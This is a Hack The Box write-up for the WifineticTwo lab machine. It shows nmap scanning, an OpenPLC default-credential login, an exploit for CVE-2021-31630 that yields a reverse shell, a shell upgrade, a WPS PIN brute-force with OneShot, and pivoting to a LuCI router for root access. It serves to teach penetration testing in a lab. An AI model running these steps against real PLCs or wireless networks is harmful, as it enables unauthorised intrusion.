<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><style>:root{--accent-color:#FF4D4D;--font-size:17.5px}</style><title>HTB: WifineticTwo</title>
<meta name=description content="Platform: Hack The Box Link: WifineticTwo Level: Medium OS: Linux WifineticTwo is a unique box focused on WiFi exploitation. The challenge begins with an …"><meta name=keywords content="HackTheBox"><meta property="og:url" content="https://scorpiosec.com/posts/htb-wifinetictwo/"><meta property="og:type" content="website"><meta property="og:title" content="HTB: WifineticTwo"><meta property="og:description" content="Platform: Hack The Box Link: WifineticTwo Level: Medium OS: Linux WifineticTwo is a unique box focused on WiFi exploitation. The challenge begins with an …"><meta property="og:image" content="https://scorpiosec.com/images/HTB-WifineticTwo/WifineticTwo.png"><meta property="og:image:secure_url" content="https://scorpiosec.com/images/HTB-WifineticTwo/WifineticTwo.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:title content="HTB: WifineticTwo"><meta name=twitter:description content="Platform: Hack The Box Link: WifineticTwo Level: Medium OS: Linux WifineticTwo is a unique box focused on WiFi exploitation. The challenge begins with an …"><meta property="twitter:domain" content="https://scorpiosec.com/posts/htb-wifinetictwo/"><meta property="twitter:url" content="https://scorpiosec.com/posts/htb-wifinetictwo/"><meta name=twitter:image content="https://scorpiosec.com/images/HTB-WifineticTwo/WifineticTwo.png"><link rel=canonical href=https://scorpiosec.com/posts/htb-wifinetictwo/><link rel=stylesheet type=text/css href=/css/normalize.min.css media=print><link rel=stylesheet type=text/css href=/css/main.min.css><link id=dark-theme rel=stylesheet href=/css/dark.min.css><script src=/js/bundle.min.dbdc9b4541e086f12258f5155a48310ed9f06d931aacfe9b7c85f8699b1f5cb2.js integrity="sha256-29ybRUHghvEiWPUVWkgxDtnwbZMarP6bfIX4aZsfXLI="></script></head><body><script>setThemeByUserPref()</script><header class=header><nav class=header-nav><div class=avatar><a href=https://scorpiosec.com/><img src=/redscorpio.jpg alt=avatar></a></div><div class=nav-title><a class=nav-brand href=https://scorpiosec.com/>Scorpiosec</a></div><div class=nav-links><div class=nav-link><a href=https://scorpiosec.com/posts/ aria-label><span data-feather=book></span> Posts</a></div><div class=nav-link><a href=https://scorpiosec.com/projects/ aria-label><span data-feather=code></span> Projects</a></div><div class=nav-link><a href=https://scorpiosec.com/tags/ aria-label><span data-feather=tag></span> Tags</a></div><div class=nav-link><a href=https://scorpiosec.com/categories/ aria-label><span data-feather=folder></span> Categories</a></div><div class="nav-link language-switcher"><a href=/fr/posts/htb-wifinetictwo/>Français</a></div><span class=nav-icons-divider></span><div class="nav-link dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a aria-hidden=true role=switch><span class=theme-toggle-icon data-feather=moon></span></a></div><div class=nav-link id=hamburger-menu-toggle><span class="sr-only hamburger-menu-toggle-screen-reader-target">menu</span>
<a aria-checked=false aria-labelledby=hamburger-menu-toggle id=hamburger-menu-toggle-target role=switch><span data-feather=menu></span></a></div><ul class="nav-hamburger-list visibility-hidden"><li class=nav-item><a href=https://scorpiosec.com/posts/><span data-feather=book></span> Posts</a></li><li class=nav-item><a href=https://scorpiosec.com/projects/><span data-feather=code></span> Projects</a></li><li class=nav-item><a href=https://scorpiosec.com/tags/><span data-feather=tag></span> Tags</a></li><li class=nav-item><a href=https://scorpiosec.com/categories/><span data-feather=folder></span> Categories</a></li><li class="nav-item dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a role=switch><span class=theme-toggle-icon data-feather=moon></span></a></li></ul></div></nav></header><main id=content><div class="post container"><div class=post-header-section><h1>HTB: WifineticTwo</h1><small role=doc-subtitle></small><p class=post-date>6 min read |
<span class=post-date>July 26, 2024</span></p><ul class=post-tags><li class=post-tag><a href=https://scorpiosec.com/tags/hackthebox>HackTheBox</a></li></ul></div><div class=post-content><ul><li>Platform: Hack The Box</li><li>Link: <a href=https://app.hackthebox.com/machines/WifineticTwo>WifineticTwo</a></li><li>Level: Medium</li><li>OS: Linux</li></ul><hr><p>WifineticTwo is a unique box focused on WiFi exploitation. The challenge begins with an accessible OpenPLC page using default credentials. Utilizing CVE-2021-31630, we gain an initial foothold and capture the user flag. Once inside the target system, we brute-force the WPS key, configure the wireless interface, and scan the default gateway to discover internal services. We then access the Lua Configuration Interface, set up a new password, log in via SSH, and retrieve the root flag.</p><p>Target IP address - <code>10.10.11.7</code></p><h2 id=scanning>Scanning</h2><pre tabindex=0><code>nmap -sC -sV -oA nmap/WifineticTwo 10.10.11.7
</code></pre><p><strong>Results</strong></p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>Starting Nmap 7.94SVN <span style=color:#56b6c2>(</span> https://nmap.org <span style=color:#56b6c2>)</span> at 2024-04-25 16:39 CDT
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#c678dd>for</span> 10.10.11.7
</span></span><span style=display:flex><span>Host is up <span style=color:#56b6c2>(</span>0.044s latency<span style=color:#56b6c2>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#d19a66>998</span> closed tcp ports <span style=color:#56b6c2>(</span>conn-refused<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>PORT     STATE SERVICE    VERSION
</span></span><span style=display:flex><span>22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 <span style=color:#56b6c2>(</span>Ubuntu Linux; protocol 2.0<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>| ssh-hostkey: 
</span></span><span style=display:flex><span>|   <span style=color:#d19a66>3072</span> 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae <span style=color:#56b6c2>(</span>RSA<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|   <span style=color:#d19a66>256</span> b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f <span style=color:#56b6c2>(</span>ECDSA<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|_  <span style=color:#d19a66>256</span> 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb <span style=color:#56b6c2>(</span>ED25519<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>8080/tcp open  http-proxy Werkzeug/1.0.1 Python/2.7.18
</span></span><span style=display:flex><span>|_http-server-header: Werkzeug/1.0.1 Python/2.7.18
</span></span><span style=display:flex><span>| fingerprint-strings: 
</span></span><span style=display:flex><span>|   FourOhFourRequest: 
</span></span><span style=display:flex><span>|     HTTP/1.0 <span style=color:#d19a66>404</span> NOT FOUND
</span></span><span style=display:flex><span>|     content-type: text/html; <span style=color:#e06c75>charset</span><span style=color:#56b6c2>=</span>utf-8
</span></span><span style=display:flex><span>|     content-length: <span style=color:#d19a66>232</span>
</span></span><span style=display:flex><span>|     vary: Cookie
</span></span><span style=display:flex><span>|     set-cookie: <span style=color:#e06c75>session</span><span style=color:#56b6c2>=</span>eyJfcGVybWFuZW50Ijp0cnVlfQ.ZirNoQ.AmaMpNOmDGYGQIpwEDtx5obFU08; <span style=color:#e06c75>Expires</span><span style=color:#56b6c2>=</span>Thu, 25-Apr-2024 21:44:45 GMT; HttpOnly; <span style=color:#e06c75>Path</span><span style=color:#56b6c2>=</span>/
</span></span><span style=display:flex><span>|     server: Werkzeug/1.0.1 Python/2.7.18
</span></span><span style=display:flex><span>|     date: Thu, <span style=color:#d19a66>25</span> Apr <span style=color:#d19a66>2024</span> 21:39:45 GMT
</span></span><span style=display:flex><span>|     &lt;!DOCTYPE HTML PUBLIC <span style=color:#98c379>&#34;-//W3C//DTD HTML 3.2 Final//EN&#34;</span>&gt;
</span></span><span style=display:flex><span>|     &lt;title&gt;404 Not Found&lt;/title&gt;
</span></span><span style=display:flex><span>|     &lt;h1&gt;Not Found&lt;/h1&gt;
</span></span><span style=display:flex><span>|     &lt;p&gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&lt;/p&gt;
</span></span><span style=display:flex><span>|   GetRequest: 
</span></span><span style=display:flex><span>|     HTTP/1.0 <span style=color:#d19a66>302</span> FOUND
</span></span><span style=display:flex><span>|     content-type: text/html; <span style=color:#e06c75>charset</span><span style=color:#56b6c2>=</span>utf-8
</span></span><span style=display:flex><span>|     content-length: <span style=color:#d19a66>219</span>
</span></span><span style=display:flex><span>|     location: http://0.0.0.0:8080/login
</span></span><span style=display:flex><span>|     vary: Cookie
</span></span><span style=display:flex><span>|     set-cookie: <span style=color:#e06c75>session</span><span style=color:#56b6c2>=</span>eyJfZnJlc2giOmZhbHNlLCJfcGVybWFuZW50Ijp0cnVlfQ.ZirNoA.yRUPYgrZ-4AxE2_xa8pbWYvKGq8; <span style=color:#e06c75>Expires</span><span style=color:#56b6c2>=</span>Thu, 25-Apr-2024 21:44:44 GMT; HttpOnly; <span style=color:#e06c75>Path</span><span style=color:#56b6c2>=</span>/
</span></span><span style=display:flex><span>|     server: Werkzeug/1.0.1 Python/2.7.18
</span></span><span style=display:flex><span>|     date: Thu, <span style=color:#d19a66>25</span> Apr <span style=color:#d19a66>2024</span> 21:39:44 GMT
</span></span><span style=display:flex><span>|     &lt;!DOCTYPE HTML PUBLIC <span style=color:#98c379>&#34;-//W3C//DTD HTML 3.2 Final//EN&#34;</span>&gt;
</span></span><span style=display:flex><span>|     &lt;title&gt;Redirecting...&lt;/title&gt;
</span></span><span style=display:flex><span>|     &lt;h1&gt;Redirecting...&lt;/h1&gt;
</span></span><span style=display:flex><span>|     &lt;p&gt;You should be redirected automatically to target URL: &lt;a <span style=color:#e06c75>href</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;/login&#34;</span>&gt;/login&lt;/a&gt;. If not click the link.
</span></span><span style=display:flex><span>|   HTTPOptions: 
</span></span><span style=display:flex><span>|     HTTP/1.0 <span style=color:#d19a66>200</span> OK
</span></span><span style=display:flex><span>|     content-type: text/html; <span style=color:#e06c75>charset</span><span style=color:#56b6c2>=</span>utf-8
</span></span><span style=display:flex><span>|     allow: HEAD, OPTIONS, GET
</span></span><span style=display:flex><span>|     vary: Cookie
</span></span><span style=display:flex><span>|     set-cookie: <span style=color:#e06c75>session</span><span style=color:#56b6c2>=</span>eyJfcGVybWFuZW50Ijp0cnVlfQ.ZirNoA.Q1AI3_zm-RnXi7eGU_QELZS5lag; <span style=color:#e06c75>Expires</span><span style=color:#56b6c2>=</span>Thu, 25-Apr-2024 21:44:44 GMT; HttpOnly; <span style=color:#e06c75>Path</span><span style=color:#56b6c2>=</span>/
</span></span><span style=display:flex><span>|     content-length: <span style=color:#d19a66>0</span>
</span></span><span style=display:flex><span>|     server: Werkzeug/1.0.1 Python/2.7.18
</span></span><span style=display:flex><span>|     date: Thu, <span style=color:#d19a66>25</span> Apr <span style=color:#d19a66>2024</span> 21:39:44 GMT
</span></span><span style=display:flex><span>|   RTSPRequest: 
</span></span><span style=display:flex><span>|     HTTP/1.1 <span style=color:#d19a66>400</span> Bad request
</span></span><span style=display:flex><span>|     content-length: <span style=color:#d19a66>90</span>
</span></span><span style=display:flex><span>|     cache-control: no-cache
</span></span><span style=display:flex><span>|     content-type: text/html
</span></span><span style=display:flex><span>|     connection: close
</span></span><span style=display:flex><span>|     &lt;html&gt;&lt;body&gt;&lt;h1&gt;400 Bad request&lt;/h1&gt;
</span></span><span style=display:flex><span>|     Your browser sent an invalid request.
</span></span><span style=display:flex><span>|_    &lt;/body&gt;&lt;/html&gt;
</span></span><span style=display:flex><span>| http-title: Site doesn&#39;t have a title <span style=color:#56b6c2>(</span>text/html; <span style=color:#e06c75>charset</span><span style=color:#56b6c2>=</span>utf-8<span style=color:#56b6c2>)</span>.
</span></span><span style=display:flex><span>|_Requested resource was http://10.10.11.7:8080/login
</span></span><span style=display:flex><span><span style=color:#d19a66>1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
</span></span><span style=display:flex><span>SF-Port8080-TCP:V<span style=color:#56b6c2>=</span>7.94SVN%I<span style=color:#56b6c2>=</span>7%D<span style=color:#56b6c2>=</span>4/25%Time<span style=color:#56b6c2>=</span>662ACD97%P<span style=color:#56b6c2>=</span>x86_64-pc-linux-gnu%r
</span></span><span style=display:flex><span>SF:<span style=color:#56b6c2>(</span>GetRequest,24C,<span style=color:#98c379>&#34;HTTP/1\.0\x20302\x20FOUND\r\ncontent-type:\x20text/htm
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:l;\x20charset=utf-8\r\ncontent-length:\x20219\r\nlocation:\x20http://0\
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:.0\.0\.0:8080/login\r\nvary:\x20Cookie\r\nset-cookie:\x20session=eyJfZn
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:Jlc2giOmZhbHNlLCJfcGVybWFuZW50Ijp0cnVlfQ\.ZirNoA\.yRUPYgrZ-4AxE2_xa8pbW
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:YvKGq8;\x20Expires=Thu,\x2025-Apr-2024\x2021:44:44\x20GMT;\x20HttpOnly;
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:\x20Path=/\r\nserver:\x20Werkzeug/1\.0\.1\x20Python/2\.7\.18\r\ndate:\x
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:20Thu,\x2025\x20Apr\x202024\x2021:39:44\x20GMT\r\n\r\n&lt;!DOCTYPE\x20HTML
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:\x20PUBLIC\x20\&#34;-//W3C//DTD\x20HTML\x203\.2\x20Final//EN\&#34;&gt;\n&lt;title&gt;Red
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:irecting\.\.\.&lt;/title&gt;\n&lt;h1&gt;Redirecting\.\.\.&lt;/h1&gt;\n&lt;p&gt;You\x20should\x2
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:0be\x20redirected\x20automatically\x20to\x20target\x20URL:\x20&lt;a\x20hre
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:f=\&#34;/login\&#34;&gt;/login&lt;/a&gt;\.\x20\x20If\x20not\x20click\x20the\x20link\.&#34;</span><span style=color:#56b6c2>)</span>%
</span></span><span style=display:flex><span>SF:r<span style=color:#56b6c2>(</span>HTTPOptions,14E,<span style=color:#98c379>&#34;HTTP/1\.0\x20200\x20OK\r\ncontent-type:\x20text/html
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:;\x20charset=utf-8\r\nallow:\x20HEAD,\x20OPTIONS,\x20GET\r\nvary:\x20Co
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:okie\r\nset-cookie:\x20session=eyJfcGVybWFuZW50Ijp0cnVlfQ\.ZirNoA\.Q1AI
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:3_zm-RnXi7eGU_QELZS5lag;\x20Expires=Thu,\x2025-Apr-2024\x2021:44:44\x20
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:GMT;\x20HttpOnly;\x20Path=/\r\ncontent-length:\x200\r\nserver:\x20Werkz
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:eug/1\.0\.1\x20Python/2\.7\.18\r\ndate:\x20Thu,\x2025\x20Apr\x202024\x2
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:021:39:44\x20GMT\r\n\r\n&#34;</span><span style=color:#56b6c2>)</span>%r<span style=color:#56b6c2>(</span>RTSPRequest,CF,<span style=color:#98c379>&#34;HTTP/1\.1\x20400\x20Bad\x2
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:0request\r\ncontent-length:\x2090\r\ncache-control:\x20no-cache\r\ncont
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:ent-type:\x20text/html\r\nconnection:\x20close\r\n\r\n&lt;html&gt;&lt;body&gt;&lt;h1&gt;4
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:00\x20Bad\x20request&lt;/h1&gt;\nYour\x20browser\x20sent\x20an\x20invalid\x20
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:request\.\n&lt;/body&gt;&lt;/html&gt;\n&#34;</span><span style=color:#56b6c2>)</span>%r<span style=color:#56b6c2>(</span>FourOhFourRequest,224,<span style=color:#98c379>&#34;HTTP/1\.0\x20404
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:\x20NOT\x20FOUND\r\ncontent-type:\x20text/html;\x20charset=utf-8\r\ncon
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:tent-length:\x20232\r\nvary:\x20Cookie\r\nset-cookie:\x20session=eyJfcG
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:VybWFuZW50Ijp0cnVlfQ\.ZirNoQ\.AmaMpNOmDGYGQIpwEDtx5obFU08;\x20Expires=T
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:hu,\x2025-Apr-2024\x2021:44:45\x20GMT;\x20HttpOnly;\x20Path=/\r\nserver
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF::\x20Werkzeug/1\.0\.1\x20Python/2\.7\.18\r\ndate:\x20Thu,\x2025\x20Apr\
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:x202024\x2021:39:45\x20GMT\r\n\r\n&lt;!DOCTYPE\x20HTML\x20PUBLIC\x20\&#34;-//W
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:3C//DTD\x20HTML\x203\.2\x20Final//EN\&#34;&gt;\n&lt;title&gt;404\x20Not\x20Found&lt;/ti
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:tle&gt;\n&lt;h1&gt;Not\x20Found&lt;/h1&gt;\n&lt;p&gt;The\x20requested\x20URL\x20was\x20not\x
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:20found\x20on\x20the\x20server\.\x20If\x20you\x20entered\x20the\x20URL\
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:x20manually\x20please\x20check\x20your\x20spelling\x20and\x20try\x20aga
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:in\.&lt;/p&gt;\n&#34;</span><span style=color:#56b6c2>)</span>;
</span></span><span style=display:flex><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span>Nmap <span style=color:#c678dd>done</span>: <span style=color:#d19a66>1</span> IP address <span style=color:#56b6c2>(</span><span style=color:#d19a66>1</span> host up<span style=color:#56b6c2>)</span> scanned in 17.39 seconds
</span></span></code></pre></div><p>Our scan reveals two open ports 22 (SSH) and 8080 (http-proxy).</p><h2 id=enumeration>Enumeration</h2><p>We find a login form at <code>http://10.10.11.7:8080</code> for OpenPLC Webserver.</p><p><img src=/images/HTB-WifineticTwo/OpenPLC-webserver.png alt="OpenPLC login form"></p><p>The default credentials allow us to login.</p><p><img src=/images/HTB-WifineticTwo/openplc-creds.png alt="OpenPLC default credentials"></p><p>We access the Dashboard. The different sections give us some information but nothing is standing out at the moment.</p><p><img src=/images/HTB-WifineticTwo/openPLC-dashboard.png alt="OpenPLC dashboard"></p><h2 id=initial-foothold>Initial Foothold</h2><p>We find <a href=https://nvd.nist.gov/vuln/detail/CVE-2021-31630>CVE-2021-31630</a> which is a command injection vulnerability for Open PLC Webserver v3 and an exploit is available <a href=https://github.com/Hunt3r0x/CVE-2021-31630-HTB>here</a>.</p><blockquote><p>To make this exploit work you have to add the target IP as <code>wifinetictwo.htb</code> in your <code>/etc/hosts</code> file.</p></blockquote><p>After running the exploit we catch a shell on out listener.</p><pre tabindex=0><code>python ./exploit.py -ip &lt;IP_ADDRESS&gt; -p &lt;PORT_NUMBER&gt; -u openplc -pwd openplc
</code></pre><p><img src=/images/HTB-WifineticTwo/openplc-rce.png alt="OpenPLC RCE"></p><p><img src=/images/HTB-WifineticTwo/foothold.png alt="WifineticTwo foothold"></p><p>Our shell can be upgraded with the commands below.</p><pre tabindex=0><code>python3 -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;  
export TERM=xterm  
ctrl + z  
stty raw -echo; fg
stty rows 38 columns 116
</code></pre><p>We are connected as <code>root</code> and we recover the user flag in <code>/root</code>.</p><p><img src=/images/HTB-WifineticTwo/user-flag.png alt="WifineticTwo user flag"></p><h2 id=privilege-escalation>Privilege Escalation</h2><p>It is definitely odd that we were already root for the first flag. This probably means that we need to do some kind of pivoting or access another service.</p><p>The name of this box obviously points at WiFi so let&rsquo;s check the network interfaces with <code>ifconfig</code>.</p><p><img src=/images/HTB-WifineticTwo/ifconfig-cmd.png alt="WifineticTwo ifconfig command"></p><p>We find a wireless network interface <code>wlan0</code>, we know that HTB machines are VMs and do not have internet access so this network interface probably is leveraging some WiFi virtualization.</p><p>We can retrieve information about the wireless interface with <code>iw dev wlan0 scan</code>. In our case the scan reveals a WiFi network called <code>plcrouter</code> with a BSSID of <code>02:00:00:00:01:00</code>, it is also running <code>WPS: Version: 1.0</code>.</p><p><img src=/images/HTB-WifineticTwo/iw-scan.png alt="WifineticTwo iw scan"></p><p>After reading the <a href=https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-wifi#wps>Pentesting Wifi page</a> on HackTricks, we discovered that we can brute-force WPS keys. Our issue is that in order to use tools such as <code>reaver</code> and <code>bully</code> we need a wireless adapter (which I do not have currently). Fortunately we can also use <a href=https://github.com/nikita-yfh/OneShot-C>OneShot-C</a> to perform the attack.</p><blockquote><p>I ended up using the <a href=https://github.com/kimocoder/OneShot>Python version</a> of OneShot because I had issues compiling the C version.</p></blockquote><p>We clone the repo, and send the <code>oneshot.py</code> file to the target with <code>curl</code>.</p><p><img src=/images/HTB-WifineticTwo/oneshot-py.png alt=One-shot-py></p><p>We can see how to use the script with <code>python3 oneshot.py -h</code>.</p><p><img src=/images/HTB-WifineticTwo/oneshot-py-help.png alt="One-shot-py help"></p><p>We then run our attack with the command below using the interface name and the BSSID. We successfully recover the key which is <code>NoWWEDoKnowWhaTisReal123!</code>.</p><pre tabindex=0><code>python3 ./oneshot.py -i wlan0 -b 02:00:00:00:01:00 -K
</code></pre><p><img src=/images/HTB-WifineticTwo/oneshot-attack.png alt="One-shot attack"></p><p>Now we need to learn how to connect to WiFi from the command line. We learn from <a href=https://askubuntu.com/questions/138472/how-do-i-connect-to-a-wpa-wifi-network-using-the-command-line>this thread</a> and <a href=https://unix.stackexchange.com/questions/283722/how-to-connect-to-wifi-from-command-line>that one</a> that we need a configuration file.</p><p>We create it with <code>wpa_passphrase</code>.</p><pre tabindex=0><code>wpa_passphrase &#39;plcrouter&#39; &#39;NoWWEDoKnowWhaTisReal123!&#39; &gt; wpa.conf
</code></pre><p><img src=/images/HTB-WifineticTwo/wpa_passphrase.png alt="WPA config file"></p><blockquote><p>The WPA supplicant process is responsible for managing wireless connections on Linux systems.</p></blockquote><pre tabindex=0><code>wpa_supplicant -B -c wpa.conf -i wlan0
</code></pre><p><img src=/images/HTB-WifineticTwo/wpa_supplicant.png alt="WPA supplicant"></p><p>We verify the interface configuration with <code>iwconfig</code>.</p><p><img src=/images/HTB-WifineticTwo/iwconfig.png alt="iwconfig command"></p><p>Using <code>ifconfig</code> we can see that the interface is up but there is no IP address configured for <code>wlan0</code>.</p><p><img src=/images/HTB-WifineticTwo/ifconfig-noIP.png alt="wlan0 no IP address"></p><p>We can manually set an IP address with</p><pre tabindex=0><code>ifconfig wlan0 &lt;IP_ADDRESS&gt; netmask &lt;NETWORK_MASK&gt;
</code></pre><pre tabindex=0><code>ifconfig wlan0 192.168.1.50 netmask 255.255.255.0
</code></pre><p><img src=/images/HTB-WifineticTwo/ifconfig-IP.png alt="ifconfig IP address"></p><p>Now that we have our new interface properly set up let&rsquo;s scan it in hopes of discovering more leads.</p><p>We download the nmap binary from <a href=https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap>here</a> and send it to the target. Make sure to make it executable with <code>chmod +x nmap</code>.</p><pre tabindex=0><code>./nmap -sn 192.168.1.0/24
</code></pre><p>We see the default gateway <code>192.168.1.1</code> and our configured address <code>192.168.1.50</code> among others.</p><p><img src=/images/HTB-WifineticTwo/nmap_scan.png alt="nmap scan configured IP address"></p><p>After scanning the default gateway we discover more services, we will need some tunneling to access them (I used chisel for this box).</p><p><img src=/images/HTB-WifineticTwo/nmap-internal.png alt="nmap default gateway scan"></p><p>We find a page with a title of <code>ap - LuCI</code>, which is referring to the <a href=https://launchpad.net/luci>Lua Configuration Interface</a>, &ldquo;a collection of free Lua software for embedded devices.&rdquo;</p><p><img src=/images/HTB-WifineticTwo/LuCI.png alt="LuCI page"></p><p>For the authentication <code>root</code> will work for the password and we are asked to configure a new one.</p><p>Under <code>System</code> &ndash;> <code>Administration</code> we notice that we have the option to login with a password.</p><p><img src=/images/HTB-WifineticTwo/LuCI-SSH-access.png alt="LuCI SSH access"></p><p>With our newly configured password we login via SSH and find the root flag.</p><p><img src=/images/HTB-WifineticTwo/root-flag.png alt="Root flag"></p><h2 id=closing-words>Closing Words</h2><p>I enjoyed this box as it was a nice change of pace from the usual web-based exploitation, I hope I was able to be helpful with this write up. Thank you for checking my blog!</p></div><div class=prev-next><div class=prev-post><p><a href=/posts/htb-headless/>&#8592;
Previous:
HTB: Headless</a></p><p class=prev-post-date>July 19, 2024</p></div><div class=next-post><p><a href=/posts/htb-iclean/>Next:
HTB: IClean
&#8594;</a></p><p class=next-post-date>August 1, 2024</p></div></div><svg id="btt-button" class="arrow-logo" xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 384 512" onclick="scrollToTop()" title="Go to top"><path d="M177 159.7l136 136c9.4 9.4 9.4 24.6.0 33.9l-22.6 22.6c-9.4 9.4-24.6 9.4-33.9.0L160 255.9l-96.4 96.4c-9.4 9.4-24.6 9.4-33.9.0L7 329.7c-9.4-9.4-9.4-24.6.0-33.9l136-136c9.4-9.5 24.6-9.5 34-.1z"/></svg>
<script>let backToTopButton=document.getElementById("btt-button");window.onscroll=function(){scrollFunction()};function scrollFunction(){document.body.scrollTop>20||document.documentElement.scrollTop>20?backToTopButton.style.display="block":backToTopButton.style.display="none"}function scrollToTop(){window.scrollTo(0,0)}</script></div><aside class=post-toc><nav id=toc><nav id=TableOfContents><ul><li><ul><li><a href=#scanning>Scanning</a></li><li><a href=#enumeration>Enumeration</a></li><li><a href=#initial-foothold>Initial Foothold</a></li><li><a href=#privilege-escalation>Privilege Escalation</a></li><li><a href=#closing-words>Closing Words</a></li></ul></li></ul></nav></nav></aside></main><footer class=footer><span>&copy; 2024 K-Scorpio</span>
<span>Made with &#10084;&#65039; using <a target=_blank href=https://github.com/gokarna-theme/gokarna-hugo>Gokarna</a></span></footer></body></html>